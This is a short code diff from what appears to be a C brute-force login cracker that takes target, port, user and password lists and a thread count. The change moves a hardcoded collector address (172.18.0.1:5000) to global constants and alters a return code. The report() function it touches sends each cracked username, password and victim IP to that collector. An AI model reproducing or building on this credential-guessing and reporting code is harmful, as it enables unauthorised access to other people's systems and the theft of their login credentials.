@@ -70,6 +70,8 @@ uint8_t verbose = 0;
 struct timespec start, finish;
 double elapsed;
 char *resultuser, *resultpass = NULL;
+const char* report_ip = "172.18.0.1"; // WARNING: hardcoded for now
+const char* report_port = "5000";
 
 void print_usage(char* pname) {
 	printf("\nUsage: %s <target ip> <port> <userfile> <passfile> <n thread> [options]\n\n"
@@ -455,8 +457,6 @@ void negotiate(int sock, unsigned char* buf, int len) {
 int report(char* username, char* password, char* ip) {
 	struct addrinfo *report_addr;
 	int sockfd;
-	char* report_ip = "172.18.0.1"; // WARNING: hardcoded for now
-	char* report_port = "5000";
 	if (getaddrinfo(report_ip, report_port, NULL, &report_addr) < 0) {
 		perror("getaddrinfo error\n");
 		return 1;
@@ -487,7 +487,7 @@ int report(char* username, char* password, char* ip) {
 	int rc;
 	if ((rc = sendch(sockfd, report_info)) < 0 ) {
 		printf("sendch error\n");
-		return 4;
+		return 1;
 	}
 
 	printf("sent %s\n", report_info);
